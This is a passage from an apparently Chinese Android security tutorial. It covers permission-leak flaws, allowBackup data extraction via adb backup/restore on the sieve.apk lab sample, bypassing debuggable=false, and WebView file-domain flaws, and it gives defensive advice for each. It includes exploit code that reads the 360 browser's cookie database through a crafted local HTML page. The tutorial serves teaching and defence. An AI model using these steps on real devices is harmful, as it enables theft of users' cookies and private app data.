intent.getExtras().getString(<span class=\"string\">&quot;url&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">fileName</span> <span class=\"operator\">=</span> intent.getExtras().getString(<span class=\"string\">&quot;fileName&quot;</span>);</span><br><span class=\"line\">            Toast.makeText(context,<span class=\"string\">&quot;Downlaod start!&quot;</span>+url+<span class=\"string\">&quot;---&quot;</span>+fileName,Toast.LENGTH_LONG).show();</span><br><span class=\"line\">            Log.i(<span class=\"string\">&quot;test&quot;</span>,url+fileName);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//throw new UnsupportedOperationException(&quot;Not yet implemented&quot;);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>攻击程序：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\">        <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">        intent.setAction(<span class=\"string\">&quot;com.example.down&quot;</span>);</span><br><span class=\"line\">        intent.putExtra(<span class=\"string\">&quot;url&quot;</span>,<span class=\"string\">&quot;https://www.baidu.com/&quot;</span>);</span><br><span class=\"line\">        intent.putExtra(<span class=\"string\">&quot;filename&quot;</span>,<span class=\"string\">&quot;baidu&quot;</span>);</span><br><span class=\"line\">        sendBroadcast(intent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>效果显示：</strong></p>\n<p>测试样例：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/6.png\" alt=\"image-20211026135228985\"></p>\n<p>攻击样例：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/7.png\" alt=\"image-20211026135354598\"></p>\n<p>我们可以很明显发现，我们可以通过进程B发送广播到进程A，从而调用进程A的下载功能，开始下载</p>\n<h4 id=\"（2）猎豹清理大师内存清理权限泄漏漏洞\"><a href=\"#（2）猎豹清理大师内存清理权限泄漏漏洞\" class=\"headerlink\" title=\"（2）猎豹清理大师内存清理权限泄漏漏洞\"></a>（2）猎豹清理大师内存清理权限泄漏漏洞</h4><p>这个案例是一个很早之前的漏洞，现在参考意义不大，不过大家可以借助其学习其原理即可</p>\n<p><strong>漏洞描述：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android应用程序猎豹清理大师存在自定义的权限android.permission.RESTART_PACKAGES，该权限主要用来结束进程来达到清理内存的目的，当其他没有申请此权限的app向目标程序发送相应的intent时，便可以结束后台运行的部分app进程</span><br></pre></td></tr></table></figure>\n\n<p><strong>漏洞实现：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/8.png\" alt=\"image-20211026140524902\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/9.png\" alt=\"image-20211026140633874\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/10.png\" alt=\"image-20211026140609720\"></p>\n<p>这就是很典型的我们利用个人定义的权限，来攻击目标程序，达到权限泄漏漏洞的目标</p>\n<h3 id=\"3-漏洞防护\"><a href=\"#3-漏洞防护\" class=\"headerlink\" title=\"3.漏洞防护\"></a>3.漏洞防护</h3><h4 id=\"（1）组件设置不可导出\"><a href=\"#（1）组件设置不可导出\" class=\"headerlink\" title=\"（1）组件设置不可导出\"></a>（1）组件设置不可导出</h4><p>我们从上面的两个案例可以发现，Android的权限泄漏漏洞往往和四大组件相互关联，我们对一些重要组件设置不可导出，就可以达到一定的保护效果</p>\n<h4 id=\"（2）设置权限级别\"><a href=\"#（2）设置权限级别\" class=\"headerlink\" title=\"（2）设置权限级别\"></a>（2）设置权限级别</h4><p>我们可以对自定义的权限一定要设置相应的保护级别，从上文我们可以得出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">android:protectionLevel=&quot;normal&quot;，不需要动态申请 </span><br><span class=\"line\">android:protectionLevel=&quot;dangerous&quot;，需要动态申请</span><br><span class=\"line\">android:protectionLevel=&quot;signature|signatureOrSystem&quot;,需要两个程序签名相同才能访问，这样就可以很好的避免权限泄漏的风险</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、Android默认设置介绍\"><a href=\"#四、Android默认设置介绍\" class=\"headerlink\" title=\"四、Android默认设置介绍\"></a>四、Android默认设置介绍</h2><p>在上文中已经向大家详细介绍了Android中的权限安全漏洞的情况，接下来我们进一步了解Android中的默认设置以及默认设置引起的安全问题，Android中的默认设置主要分为：AndroidManifest.xml配置文件和WebView的默认设置</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/11.png\" alt=\"image-20211026144059511\"></p>\n<h4 id=\"（1）AndroidManifest-xml默认设置\"><a href=\"#（1）AndroidManifest-xml默认设置\" class=\"headerlink\" title=\"（1）AndroidManifest.xml默认设置\"></a>（1）AndroidManifest.xml默认设置</h4><p>这里我总结了AndroidManifest.xml的基本结构图</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/12.png\" alt=\"image-20211026144059511\"></p>\n<p>这里我们主要关注allowBackup、Debuggable、组件默认导出</p>\n<h5 id=\"lt-1-gt-allowBackup\"><a href=\"#lt-1-gt-allowBackup\" class=\"headerlink\" title=\"&lt;1&gt; allowBackup\"></a>&lt;1&gt; allowBackup</h5><p>Android API Level 8及其以上Android系统提供了应用程序的备份和恢复功能，这是由AndroidManifest.xml文件中的<code>allowBackup</code>属性决定，allowBackup 标志为 true 时，用户即可通过 <code>adb backup</code> 和 <code>adb restore</code> 来进行对应用数据的备份和恢复</p>\n<p>Android 属性allowBackup 安全风险源于adb backup容许任何一个人能够打开USB调试开关，从Android手机中复制应用数据到外设，一旦数据被备份之后，所有应用数据都可被用户读取。<code>adb restore</code> 容许用户指定一个恢复的数据来源（即备份的应用数据）来恢复应用程序数据的创建</p>\n<p><strong>安全影响：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">通讯录应用，一旦应用程序支持备份和恢复功能，攻击者即可通过 adb backup 和 adb restore 进行恢复新安装的同一个应用来查看聊天记录等信息</span><br><span class=\"line\">支付金融类应用，攻击者可通过此来进行恶意支付、盗取存款等</span><br></pre></td></tr></table></figure>\n\n<p><strong>allowBackup安全风险详情：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.allowBackup 风险位置：AndroidMannifest.xml 文件 android:allowBackup 属性</span><br><span class=\"line\">2.allowBackup 风险触发前提条件：未将 AndroidMannifest.xml 文件中的 android:allowBackup 属性值设为 false</span><br><span class=\"line\">3.allowBackup 风险原理：当 allowBackup 标志值为 true 时，即可通过 adb backup 和 adb restore 来备份和恢复应用程序数据</span><br></pre></td></tr></table></figure>\n\n<p><strong>数据备份：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">命令：adb backup  [-system|nosystem] -all [-apk|-noapk] [-shared|-noshared] -f &lt;档案名称&gt;[需要备份的应用包名]</span><br><span class=\"line\">    </span><br><span class=\"line\">[-system|nosystem]</span><br><span class=\"line\">这个指令告诉adb在备份时是否要连同系统一起备份，若没有打开的话，默认是-system表示会一起备份系统，若连系统一起备份，在还原时候会覆盖系统档案，这对已经升级的手机是非常不好的，-nosystem是建议要打上去的指令</span><br><span class=\"line\"></span><br><span class=\"line\">-all</span><br><span class=\"line\">这个指令除非要备份单一App不然是一定要打上去的，表示是否备份全部的App，若有加上`-nosystem`，就只会备份你目前已经安装上去的App而不会连系统App一起备份</span><br><span class=\"line\"></span><br><span class=\"line\">[-apk|-noapk]</span><br><span class=\"line\">默认是-noapk，这个参数的意思是，是否连安装的apk一起备份，若为-noapk，则只会备份apk的资料档</span><br><span class=\"line\"></span><br><span class=\"line\">[-shared|-noshared]</span><br><span class=\"line\">默认是`-noshared`，表示是否连手机存储空间或是SD卡的档案一起备份</span><br><span class=\"line\"></span><br><span class=\"line\">-f</span><br><span class=\"line\">用这个来选择备份文件存储在哪里，例如-f /backup/applock.ab将会使文件存储在根磁盘（Windows的C盘等等）下一个名为backup的文件夹里，并且备份文件名为applock.ab</span><br></pre></td></tr></table></figure>\n\n<p>例如我们直接备份</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb backup  -apk  -shared  -system  -all  -f  applock.ab</span><br></pre></td></tr></table></figure>\n\n<p>就会在电脑默认路径下产生applock.ab文件，大小与系统有关</p>\n<p><strong>查看数据：</strong></p>\n<p>一般我们使用abe工具来解析ab文件，工具参考网址：<a href=\"https://github.com/nelenkov/android-backup-extractor/releases\">abe工具</a></p>\n<p>解压命令：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar ade.jar unpack <span class=\"number\">1.</span>ab <span class=\"number\">1.</span>tar </span><br></pre></td></tr></table></figure>\n\n<p><strong>恢复数据：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb restore applock.ab</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-debuggable\"><a href=\"#lt-2-gt-debuggable\" class=\"headerlink\" title=\"&lt;2&gt; debuggable\"></a>&lt;2&gt; debuggable</h5><p><code>android:debuggable</code>属性是指定应用程序是否能够被调试，即时是以用户模式运行在设备上的时候，如果设置为 true ，则能够被调试，否则不能调试，默认值是false</p>\n<p>逆向工作人员在对一个apk程序进行逆向时，第一步往往就是要对debuggable属性进行绕过，否则就不能进行正常的调试，因此如果属性本身设为true，更容易导致该应用存在动态调试，泄露数据信息的风险</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/13.png\" alt=\"image-20211026164320202\"></p>\n<h5 id=\"lt-3-gt-exported\"><a href=\"#lt-3-gt-exported\" class=\"headerlink\" title=\"&lt;3&gt; exported\"></a>&lt;3&gt; exported</h5><p>前几篇帖子，我们讲述四大组件过程中，经常会涉及到exported导出导致的漏洞，exported组件导出，会导致导出的组件被第三方APP任意调用，导致敏感信息，并可能受到绕过认证、恶意代码注入等风险，由于前面我们已经讲得很详细了，这里就不再做过多描述</p>\n<h4 id=\"（2）WebView默认设置\"><a href=\"#（2）WebView默认设置\" class=\"headerlink\" title=\"（2）WebView默认设置\"></a>（2）WebView默认设置</h4><p>WebView是android中用来展示网页的重要控件，Android中经常会使用WebView来实现Web页面的展示，在Activity中启动自己的浏览器或者简单的展示一些在线内容等，而WebView上的漏洞问题也各种各样，过去几年内WebView中被披露的重大漏洞包括了任意代码执行漏洞、跨域、密码明文保存等，后面我们将WebView作为一个专题讲述上面存在的漏洞问题，这里我们只关注WebView中默认设置的安全问题</p>\n<p>后面我们主要讲述WebView上几方面的默认设置漏洞</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/14.png\" alt=\"image-20211026165646971\"></p>\n<h2 id=\"五、Android默认设置漏洞原理分析和复现\"><a href=\"#五、Android默认设置漏洞原理分析和复现\" class=\"headerlink\" title=\"五、Android默认设置漏洞原理分析和复现\"></a>五、Android默认设置漏洞原理分析和复现</h2><h3 id=\"1-allowBackup\"><a href=\"#1-allowBackup\" class=\"headerlink\" title=\"1. allowBackup\"></a>1. allowBackup</h3><h4 id=\"（1）备份安全设置信息泄露漏洞\"><a href=\"#（1）备份安全设置信息泄露漏洞\" class=\"headerlink\" title=\"（1）备份安全设置信息泄露漏洞\"></a>（1）备份安全设置信息泄露漏洞</h4><p>上文我们已经详细的给大家讲述了<code>allowBackup</code>设置<code>true</code>的安全性，接下来我拿一个案例带大家深入了解：</p>\n<h5 id=\"lt-1-gt-漏洞复现\"><a href=\"#lt-1-gt-漏洞复现\" class=\"headerlink\" title=\"&lt;1&gt; 漏洞复现\"></a>&lt;1&gt; 漏洞复现</h5><p>样本：sieve.apk</p>\n<p><strong>信息设置：</strong></p>\n<p>首先，我们将样本安装到手机上，并打开主界面</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/15.png\" alt=\"image-20211026194532102\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/16.png\" alt=\"image-20211026194611643\"></p>\n<p>进入主程序我们发现，提示我们注册密码，而且需要至少16位，这里我们输入密码<code>zxcvbnm0123456789</code></p>\n<p>进入后，又要我们输入PIN码，我们输入<code>1234</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/18.png\" alt=\"image-20211026195015970\"></p>\n<p>然后我们发现需要再次输入密码才能进入，我们再次输入密码</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/19.png\" alt=\"image-20211026195112662\"></p>\n<p>发现右上角可以添加账户密码信息，我们添加，密码设置<code>123456</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/20.png\" alt=\"image-20211026195256415\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/21.png\" alt=\"image-20211026195314419\"></p>\n<p>这样我们就在apk中就存入了一些信息，接下来我们来看如何备份和恢复这些信息呢</p>\n<p><strong>数据备份：</strong></p>\n<p>我们先用jadx-gui打开目标程序，查看allowbackup&#x3D;true</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/22.png\" alt=\"image-20211026195645086\"></p>\n<p>这里发现是可以备份的，所以我们输入备份命令</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb backup -f allowBackup.ab -noapk com.mwr.example.sieve</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/23.png\" alt=\"image-20211026195847860\"></p>\n<p>我们的手机就弹出备份请求，如果你要加密就输入加密密码，这里我们直接备份</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/24.png\" alt=\"image-20211026195945086\"></p>\n<p>备份完成后，我们在当前目录下就可以发现我们备份的文件<code>allowBackup.ab</code></p>\n<p><strong>数据解析：</strong></p>\n<p>我们需要使用<code>abe</code>工具对备份的文件解压，下载路径：<a href=\"https://github.com/nelenkov/android-backup-extractor/releases\"><code>abe工具</code></a></p>\n<p>我们下载后，需要安装jdk环境，然后使用命令解压：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar abe.jar unpack allowBackup.ab <span class=\"number\">1.</span>tar</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/25.png\" alt=\"image-20211026200752183\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/26.png\" alt=\"image-20211026200815420\"></p>\n<p>解压</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/27.png\" alt=\"image-20211026200904172\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/28.png\" alt=\"image-20211026200925823\"></p>\n<p>我们就得到了database.db数据库，然后我们使用DB Browser for SQLite打开，下载路径：<a href=\"https://sqlitebrowser.org/\">DB Browser</a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/29.png\" alt=\"image-20211026201414775\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/30.png\" alt=\"image-20211026201601455\"></p>\n<p>这样我们就成功解析出了备份的数据信息</p>\n<p><strong>数据恢复：</strong></p>\n<p>我们卸载目标程序，然后重新安装</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/32.png\" alt=\"image-20211026204949157\"></p>\n<p>我们输入恢复命令：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb restore allowBackup.ab </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/31.png\" alt=\"image-20211026202027001\"></p>\n<p>然后我们恢复数据，数据恢复完成</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/33.png\" alt=\"image-20211026205126480\"></p>\n<p>我们再次进入发现，直接进入之前界面，说明此时我们输入之前密码，就可以成功的进入</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/34.png\" alt=\"image-20211026205258432\"></p>\n<p>登录成功，并且出现我们之前的密码信息</p>\n<h5 id=\"lt-2-gt-漏洞说明\"><a href=\"#lt-2-gt-漏洞说明\" class=\"headerlink\" title=\"&lt;2&gt; 漏洞说明\"></a>&lt;2&gt; 漏洞说明</h5><p>上文我们拿一个样例，带大家完整的复现了一遍数据备份漏洞的过程，这个过程中如果我们发现一个目标程序的<code>allowBackup</code>为true，我们可以备份下其数据信息，在另外一个安装该目标程序的手机中进行恢复，这样我们就可以获得用户的敏感数据信息了，另外一个类似的案例可以参考网址：<a href=\"https://segmentfault.com/a/1190000002590577\">阿里聚安全allowBackup安全解析</a></p>\n<h5 id=\"lt-3-gt-安全防护\"><a href=\"#lt-3-gt-安全防护\" class=\"headerlink\" title=\"&lt;3&gt; 安全防护\"></a>&lt;3&gt; 安全防护</h5><p>只需要将allowBackup设置为false即可</p>\n<h4 id=\"（2）debuggable-安全风险\"><a href=\"#（2）debuggable-安全风险\" class=\"headerlink\" title=\"（2）debuggable 安全风险\"></a>（2）debuggable 安全风险</h4><p>我们知道<code>debuggable=true</code>，用户才能进行动态调试，下面就是<code>debuggable=false</code>，使用AndroidStudio调试的情况</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/35.png\" alt=\"image-20211026210557350\"></p>\n<p>下面我们介绍几种方法绕过<code>debuggle=false</code></p>\n<h5 id=\"lt-1-gt-使用mprop\"><a href=\"#lt-1-gt-使用mprop\" class=\"headerlink\" title=\"&lt;1&gt; 使用mprop\"></a>&lt;1&gt; 使用mprop</h5><p>mprop下载地址：<a href=\"https://github.com/wpvsyou/mprop\">mprop</a></p>\n<p>原理解析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">通过修改 ro.debuggable =1 来达到调试的目的，由于不是从系统内核层面修改，所以系统重启之后需要重新配置</span><br></pre></td></tr></table></figure>\n\n<p>配置过程：</p>\n<p>首先， 将mprop文件拷贝到.&#x2F;data&#x2F;local&#x2F;tmp文件下 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb push mprop /data/local/tmp</span><br></pre></td></tr></table></figure>\n\n<p>然后运行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./mprop ro.debuggable 1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/36.png\" alt=\"image-20211026210557350\"></p>\n<p>查询是否修改成功：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">getprop ro.debuggable</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/37.png\" alt=\"image-20211026210557350\"></p>\n<p>我们修改值后，还需要重启一下，使得进程被更新，使用命令</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">stop;start</span><br></pre></td></tr></table></figure>\n\n<p>此时我们就可以进行动态调试了</p>\n<h5 id=\"lt-2-gt-使用Xposed模块\"><a href=\"#lt-2-gt-使用Xposed模块\" class=\"headerlink\" title=\"&lt;2&gt; 使用Xposed模块\"></a>&lt;2&gt; 使用Xposed模块</h5><p>xposed模块中很多都可以通过hook来修改 <code>ro.debuggable</code>的值，这里我们使用<code>App Debuggable</code>模块，<a href=\"https://repo.xposed.info/module/cn.forgiveher.appdebuggable\">下载地址</a></p>\n<p>使用过程十分简单，我们的手机上安装Xposed框架之后，我们只需要将模块安装上去，激活即可，Xposed框架安装详细看之前帖子</p>\n<h5 id=\"lt-3-gt-系统定制\"><a href=\"#lt-3-gt-系统定制\" class=\"headerlink\" title=\"&lt;3&gt; 系统定制\"></a>&lt;3&gt; 系统定制</h5><p>我们也可以通过定制系统源码的方式来实现绕过，这里考虑到文章篇幅的原因，这里我收集了一个大佬的方法，相关教程我会放到github上，大家自行参考</p>\n<h4 id=\"（3）exported导出漏洞\"><a href=\"#（3）exported导出漏洞\" class=\"headerlink\" title=\"（3）exported导出漏洞\"></a>（3）exported导出漏洞</h4><p>由于exported导出漏洞基本是和Android四大组件相关，我们在前面的帖子中已经将这里讲的比较详细了，大家可以回看前面的帖子</p>\n<p><strong>安全防护：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）权限控制</span><br><span class=\"line\">（2）设置export = false</span><br></pre></td></tr></table></figure>\n\n<p>具体参考上文和前面帖子</p>\n<h3 id=\"2-WebView安全配置漏洞\"><a href=\"#2-WebView安全配置漏洞\" class=\"headerlink\" title=\"2. WebView安全配置漏洞\"></a>2. WebView安全配置漏洞</h3><p>由于WebView涉及的漏洞较多，后面我会做一个专题归纳WebView的大部分漏洞的情况，这里只是简要列出一些配置相关的漏洞问题</p>\n<h4 id=\"（1）漏洞原理\"><a href=\"#（1）漏洞原理\" class=\"headerlink\" title=\"（1）漏洞原理\"></a>（1）漏洞原理</h4><p>webview控件将<code>setAllowFileAccessFromFileURLs</code>或<code>setAllowUniversalAcessFromFileURLsAPI</code>设置为<code>true</code>,开启了file域访问，且允许file域访问HTTP域，但是并未对file域的路径做严格限制</p>\n<p>检测方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">webview控件是否将setAllowFileAccessFromFileURLs或setAllowUniversalAcessFromFileURLsAPI设置为<span class=\"literal\">true</span></span><br><span class=\"line\">客户端是否对file:<span class=\"comment\">//路径进行严格限制</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）漏洞案例\"><a href=\"#（2）漏洞案例\" class=\"headerlink\" title=\"（2）漏洞案例\"></a>（2）漏洞案例</h4><h5 id=\"lt-1-gt-WebView密码明文存储漏洞——setSavePassword-true\"><a href=\"#lt-1-gt-WebView密码明文存储漏洞——setSavePassword-true\" class=\"headerlink\" title=\"&lt;1&gt; WebView密码明文存储漏洞——setSavePassword(true)\"></a>&lt;1&gt; WebView密码明文存储漏洞——setSavePassword(true)</h5><p>WebView默认开启密码保存功能 mWebView.setSavePassword(true)，如果该功能未关闭，在用户输入密码时，会弹出提示框，询问用户是否保存密码，如果用户确定，密码会被保存在<code>/data/data/com.package.name/databases/webview.db</code>，然后我们可以在root权限下直接拿出密码相关信息，因此建议用户密码加密存储</p>\n<h5 id=\"lt-2-gt-WebView域控制不严格漏洞\"><a href=\"#lt-2-gt-WebView域控制不严格漏洞\" class=\"headerlink\" title=\"&lt;2&gt; WebView域控制不严格漏洞\"></a>&lt;2&gt; <strong>WebView域控制不严格漏洞</strong></h5><p><strong>setAllowFileAccess</strong></p>\n<p>WebView默认开启密码保存功能 mWebView.setAllowFileAccess(true) ，在File域下，能够执行任意的JavaScript代码，同源策略跨域访问能够对私有目录文件进行访问，APP对切入WebView未对file:&#x2F;&#x2F;&#x2F;形式的URL做限制，会导致隐私信息泄漏，针对聊天软件会导致信息泄漏，针对浏览器软件，会导致cookie信息泄漏</p>\n<p><strong>setAllowFileAccessFromFileURLs</strong></p>\n<p>在JELLY_BEAN以前的版本默认是setAllowFileAccessFromFileURLs(true),允许通过file域url中的Javascript读取其他本地文件，在JELLY_BEAN及以后的版本中默认已被是禁止。</p>\n<p><strong>setAllowUniversalAccessFromFileURLs</strong></p>\n<p>在JELLY_BEAN以前的版本默认是setAllowUniversalAccessFromFileURLs(true),允许通过file域url中的Javascript访问其他的源，包括其他的本地文件和http,https源的数据。在JELLY_BEAN及以后的版本中默认已被禁止。</p>\n<p><strong>案例：360手机浏览器缺陷可导致用户敏感数据泄漏</strong></p>\n<p>以360手机浏览器4.8版本为例，由于未对file域做安全限制，恶意APP调用360浏览器加载本地的攻击页面（比如恶意APP释放到SDCARD上的一个HTML）后，就可以获取360手机浏览器下的所有私有数据，包括webviewCookiesChromium.db下的cookie内容</p>\n<p>攻击页面关键代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">getDatabase</span><span class=\"params\">()</span> &#123;  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">var</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(window.XMLHttpRequest) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">     request = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span>(request.overrideMimeType) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">           request.overrideMimeType(<span class=\"string\">&#x27;text/xml&#x27;</span>);&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    xmlhttp = request;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">var</span> <span class=\"variable\">prefix</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;file:////data/data/com.qihoo.browser/databases&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">var</span> <span class=\"variable\">postfix</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;/webviewCookiesChromium.db&quot;</span>; <span class=\"comment\">//取保存cookie的db</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">var</span> <span class=\"variable\">path</span> <span class=\"operator\">=</span> prefix.concat(postfix);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获取本地文件代码</span></span><br><span class=\"line\"></span><br><span class=\"line\">    xmlhttp.open(<span class=\"string\">&quot;GET&quot;</span>, path, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    xmlhttp.send(<span class=\"literal\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">var</span> <span class=\"variable\">ret</span> <span class=\"operator\">=</span> xmlhttp.responseText;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>漏洞利用代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">copyFile(); <span class=\"comment\">//自定义函数，释放filehehe.html到sd卡上</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;file:///mnt/sdcard/filehehe.html&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">contIntent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">contIntent.setAction(<span class=\"string\">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">contIntent.setData(Uri.parse(url));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">intent.setClassName(<span class=\"string\">&quot;com.qihoo.browser&quot;</span>,<span class=\"string\">&quot;com.qihoo.browser.BrowserActivity&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">intent.setAction(<span class=\"string\">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">intent.setData(Uri.parse(url));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">this</span>.startActivity(intent);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）安全防护\"><a href=\"#（3）安全防护\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><p>通过以下设置，防止越权访问，跨域等安全问题</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）将不必要导出的组件设置为不导出</span><br><span class=\"line\">（<span class=\"number\">2</span>）如果应用的需要导出包含 Webview的组件，禁止使用File域协议 </span><br><span class=\"line\"> setAllowFileAccess(<span class=\"literal\">false</span>)</span><br><span class=\"line\"> setAllowFileAccessFromFileURLs(<span 